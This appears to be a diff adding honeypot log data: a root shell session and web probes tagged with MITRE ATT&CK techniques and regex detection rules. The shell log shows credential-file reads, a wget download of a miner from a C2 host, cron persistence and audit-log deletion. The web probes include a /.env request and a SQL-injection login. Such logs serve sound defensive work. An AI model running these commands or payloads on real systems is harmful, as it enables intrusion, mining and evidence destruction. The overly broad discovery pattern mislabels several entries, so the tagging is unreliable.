@@ -1,0 +1,229 @@
+[
+  {
+    "session_id": "shell-1793500565-48210",
+    "type": "shell",
+    "timestamp": "2026-11-01T03:36:05.304326",
+    "source_ip": "185.220.101.5",
+    "source_port": 48210,
+    "auth": {
+      "username": "root",
+      "password": "toor123"
+    },
+    "commands": [
+      {
+        "time": "03:36:05",
+        "command": "whoami",
+        "mitre": [
+          "T1033"
+        ]
+      },
+      {
+        "time": "03:36:05",
+        "command": "uname -a",
+        "mitre": [
+          "T1082"
+        ]
+      },
+      {
+        "time": "03:36:06",
+        "command": "cat /etc/passwd",
+        "mitre": [
+          "T1003",
+          "T1033"
+        ]
+      },
+      {
+        "time": "03:36:06",
+        "command": "cat /etc/shadow",
+        "mitre": [
+          "T1003",
+          "T1033"
+        ]
+      },
+      {
+        "time": "03:36:06",
+        "command": "wget http://c2-malware.darknet.ru/miner.sh",
+        "mitre": [
+          "T1105",
+          "T1033"
+        ]
+      },
+      {
+        "time": "03:36:06",
+        "command": "chmod +x miner.sh",
+        "mitre": [
+          "T1222"
+        ]
+      },
+      {
+        "time": "03:36:07",
+        "command": "crontab -e",
+        "mitre": [
+          "T1053"
+        ]
+      },
+      {
+        "time": "03:36:07",
+        "command": "rm -rf /var/log/audit.log",
+        "mitre": [
+          "T1485"
+        ]
+      }
+    ],
+    "mitre_alerts": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "Discovery",
+        "pattern": "(whoami|id|w|who|last|groups)",
+        "severity": "LOW",
+        "desc": "Identification des privilèges de la session et des utilisateurs connectés"
+      },
+      {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "tactic": "Discovery",
+        "pattern": "(uname\\s+-[ar]|cat\\s+/etc/.*release|lscpu|hostname|uptime)",
+        "severity": "MEDIUM",
+        "desc": "Reconnaissance de l'environnement, du noyau et de la distribution"
+      },
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "pattern": "(cat\\s+/etc/(passwd|shadow)|grep\\s+.*shadow|unshadow|mimikatz|id_rsa)",
+        "severity": "CRITICAL",
+        "desc": "Tentative d'extraction de comptes ou de hashs de mots de passe système"
+      },
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "Discovery",
+        "pattern": "(whoami|id|w|who|last|groups)",
+        "severity": "LOW",
+        "desc": "Identification des privilèges de la session et des utilisateurs connectés"
+      },
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "pattern": "(cat\\s+/etc/(passwd|shadow)|grep\\s+.*shadow|unshadow|mimikatz|id_rsa)",
+        "severity": "CRITICAL",
+        "desc": "Tentative d'extraction de comptes ou de hashs de mots de passe système"
+      },
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "Discovery",
+        "pattern": "(whoami|id|w|who|last|groups)",
+        "severity": "LOW",
+        "desc": "Identification des privilèges de la session et des utilisateurs connectés"
+      },
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic": "Command and Control",
+        "pattern": "(wget\\s+|curl\\s+|tftp\\s+|ftpget\\s+|fetch\\s+|scp\\s+)",
+        "severity": "HIGH",
+        "desc": "Téléchargement d'un payload, script malveillant ou binaire distant"
+      },
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "Discovery",
+        "pattern": "(whoami|id|w|who|last|groups)",
+        "severity": "LOW",
+        "desc": "Identification des privilèges de la session et des utilisateurs connectés"
+      },
+      {
+        "id": "T1222",
+        "name": "File and Directory Permissions Modification",
+        "tactic": "Defense Evasion",
+        "pattern": "(chmod\\s+(\\+x|777|755)|chown\\s+)",
+        "severity": "MEDIUM",
+        "desc": "Rendre un payload exécutable ou modification de privilèges sur fichiers"
+      },
+      {
+        "id": "T1053",
+        "name": "Scheduled Task / Job",
+        "tactic": "Persistence",
+        "pattern": "(crontab\\s+|/etc/cron|systemctl\\s+enable)",
+        "severity": "HIGH",
+        "desc": "Tentative de persistance via tâche planifiée cron ou service système"
+      },
+      {
+        "id": "T1485",
+        "name": "Data Destruction",
+        "tactic": "Impact",
+        "pattern": "(rm\\s+-rf\\s+|mkfs|dd\\s+if=/dev/zero)",
+        "severity": "CRITICAL",
+        "desc": "Tentative de sabotage ou suppression massive de données"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1793500568",
+    "type": "web_probe",
+    "timestamp": "2026-11-01T03:36:08.117194",
+    "source_ip": "45.154.255.89",
+    "method": "GET",
+    "path": "/.env",
+    "body": "",
+    "mitre_alerts": [
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "pattern": "(SELECT\\s+.*FROM|UNION\\s+SELECT|'\\s*OR\\s*'1'='1|\\.\\./|\\.env|wp-config)",
+        "severity": "CRITICAL",
+        "desc": "Injection SQL, Directory Traversal ou tentative d'accès aux fichiers sensibles"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1793500568",
+    "type": "web_probe",
+    "timestamp": "2026-11-01T03:36:08.442648",
+    "source_ip": "45.154.255.89",
+    "method": "GET",
+    "path": "/wp-login.php",
+    "body": "",
+    "mitre_alerts": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "Discovery",
+        "pattern": "(whoami|id|w|who|last|groups)",
+        "severity": "LOW",
+        "desc": "Identification des privilèges de la session et des utilisateurs connectés"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1793500568",
+    "type": "web_probe",
+    "timestamp": "2026-11-01T03:36:08.770642",
+    "source_ip": "45.154.255.89",
+    "method": "POST",
+    "path": "/login",
+    "body": "username=admin' OR '1'='1&password=password",
+    "mitre_alerts": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "Discovery",
+        "pattern": "(whoami|id|w|who|last|groups)",
+        "severity": "LOW",
+        "desc": "Identification des privilèges de la session et des utilisateurs connectés"
+      },
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "pattern": "(SELECT\\s+.*FROM|UNION\\s+SELECT|'\\s*OR\\s*'1'='1|\\.\\./|\\.env|wp-config)",
+        "severity": "CRITICAL",
+        "desc": "Injection SQL, Directory Traversal ou tentative d'accès aux fichiers sensibles"
+      }
+    ]
+  }
+]
